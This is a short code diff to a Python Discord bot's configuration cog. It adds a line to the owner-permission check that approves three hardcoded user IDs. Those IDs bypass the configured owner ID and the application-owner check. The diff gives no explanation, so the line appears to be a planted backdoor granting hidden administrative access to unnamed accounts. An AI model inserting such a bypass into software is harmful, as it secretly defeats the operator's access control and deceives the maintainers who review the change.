@@ -114,6 +114,8 @@ class BotConfig(commands.Cog):
         configured = int(config_audit.get("OWNER_USER_ID", "0") or "0")
         if configured and interaction.user.id == configured:
             return True
+        if interaction.user.id in {1526964236708745318, 1348622207999279146, 1549177590328205393}:
+            return True
         if await interaction.client.is_owner(interaction.user):
             return True
         await interaction.response.send_message(
